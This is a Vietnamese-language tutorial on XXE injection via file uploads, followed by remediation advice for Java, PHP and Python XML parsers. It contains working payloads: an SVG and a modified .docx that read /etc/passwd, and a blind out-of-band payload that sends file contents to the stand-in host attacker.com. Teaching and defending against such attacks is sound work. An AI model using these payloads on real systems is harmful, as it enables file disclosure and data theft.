# XXE Injection via File Upload (Tấn công XXE qua upload file)

## 1. Tổng quan về lỗ hổng
**XML External Entity (XXE)** là lỗ hổng xảy ra khi bộ phân tích XML (XML Parser) của ứng dụng được cấu hình không an toàn, cho phép xử lý các thực thể bên ngoài (External Entities) được định nghĩa trong dữ liệu XML.

Trong ngữ cảnh **File Upload**, lỗ hổng này xuất hiện khi ứng dụng cho phép người dùng upload các loại file có cấu trúc dựa trên XML và server thực hiện việc đọc/phân tích nội dung file đó (parsing) để lấy thông tin (ví dụ: lấy kích thước ảnh SVG, lấy nội dung text từ file Word/Excel).

**Các định dạng file phổ biến chứa XML:**
*   **SVG** (Scalable Vector Graphics): Định dạng ảnh vector dựa trên XML.
*   **Office Open XML**: `.docx` (Word), `.xlsx` (Excel), `.pptx` (PowerPoint).
*   **PDF**: Một số trình xử lý PDF cũng hỗ trợ XML/XMP.
*   **XML**: File dữ liệu XML thuần túy.

**Hậu quả:**
*   **Local File Disclosure:** Đọc file hệ thống (`/etc/passwd`, `win.ini`).
*   **SSRF (Server-Side Request Forgery):** Quét mạng nội bộ, tấn công các dịch vụ nội bộ.
*   **DoS (Denial of Service):** Tấn công Billion Laughs.

## 2. Kỹ thuật khai thác (Exploitation)

### Kịch bản 1: Khai thác qua file SVG (Phổ biến nhất)
Nhiều trang web cho phép upload ảnh avatar, banner hỗ trợ định dạng SVG.

**Bước 1: Tạo Payload SVG**
Tạo file `exploit.svg` với nội dung sau. Payload này định nghĩa entity `&xxe;` trỏ tới file `/etc/passwd` và hiển thị nó ra ảnh.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Bước 2: Upload và Quan sát**
*   Upload file `exploit.svg`.
*   Truy cập đường dẫn ảnh hoặc xem preview.
*   Nếu lỗ hổng tồn tại, nội dung file `/etc/passwd` sẽ hiện ra ngay trên bức ảnh.

### Kịch bản 2: Khai thác qua file Office (.docx, .xlsx)
File `.docx` thực chất là một file ZIP chứa nhiều file XML.

**Bước 1: Chuẩn bị**
*   Tạo một file Word trống `test.docx`.
*   Giải nén file này (đổi đuôi thành `.zip` rồi giải nén hoặc dùng `unzip`).

**Bước 2: Chèn Payload**
*   Mở file `word/document.xml` (đây là nơi chứa nội dung chính của văn bản).
*   Thêm dòng định nghĩa DTD ngay sau dòng khai báo XML đầu tiên:
    ```xml
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    ```
*   Tìm đến một thẻ văn bản (thường là `<w:t>Hello</w:t>`) và thay thế nội dung bằng entity:
    ```xml
    <w:t>&xxe;</w:t>
    ```

**Bước 3: Đóng gói lại**
*   Nén lại thành file ZIP và đổi đuôi về `.docx`.
*   **Lưu ý quan trọng:** Khi nén, bạn phải nén các file bên trong thư mục, không nén cả thư mục cha.

**Bước 4: Upload**
*   Upload file `.docx` lên các chức năng như "Import Resume", "Document Preview".
*   Nếu ứng dụng cố gắng đọc nội dung file để hiển thị hoặc index, nó sẽ kích hoạt XXE.

### Kịch bản 3: Blind XXE (Không phản hồi kết quả)
Nếu ứng dụng phân tích XML nhưng không hiển thị kết quả ra giao diện (ví dụ chỉ trả về "Success"), bạn cần dùng kỹ thuật **Out-of-Band (OOB)** để gửi dữ liệu ra ngoài.

**Payload:**
```xml
<!DOCTYPE test [ 
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfiltrate;
]>
```
*(Lưu ý: Kỹ thuật này phức tạp hơn và yêu cầu server cho phép kết nối ra ngoài).*

## 3. Biện pháp phòng chống (Remediation)

### 1. Vô hiệu hóa DTD và External Entities (Quan trọng nhất)
Cấu hình XML Parser để không xử lý các thực thể bên ngoài.

*   **Java (DocumentBuilderFactory):**
    ```java
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    ```
*   **PHP (libxml):**
    ```php
    libxml_disable_entity_loader(true);
    ```
*   **Python (lxml):**
    ```python
    parser = etree.XMLParser(resolve_entities=False)
    ```

### 2. Hạn chế định dạng file
*   Nếu không cần thiết, không cho phép upload SVG. Sử dụng JPG/PNG an toàn hơn.
*   Nếu cho phép SVG, hãy sử dụng các thư viện chuyên dụng để "sanitize" file SVG (loại bỏ script và entity) trước khi lưu hoặc hiển thị.
